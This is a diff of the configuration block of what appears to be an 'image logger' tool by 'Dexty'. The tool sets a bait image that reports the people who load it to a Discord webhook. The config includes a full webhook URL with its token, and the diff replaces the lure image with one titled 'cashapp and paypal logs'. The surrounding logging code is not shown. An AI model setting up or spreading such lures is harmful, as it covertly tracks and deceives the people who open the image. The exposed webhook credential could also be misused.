@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1401336018442911824/LR0jAyTmCMxbc1B7HlCtmzQVDjQwjzFg0Dwv61vxAJRUGxrGpfNNBB6H3o1Zb6iEg5mw",
-    "image": "https://news.trendmicro.com/api/wp-content/uploads/2021/07/Scam-Alert_Coinbase_0702.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.reddit.com/media?url=https%3A%2F%2Fpreview.redd.it%2Fcashapp-and-paypal-logs-v0-ms1wfsund1zb1.jpg%3Fauto%3Dwebp%26s%3D7d91b573835d8dc2959d457d299150a3e847df2d", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
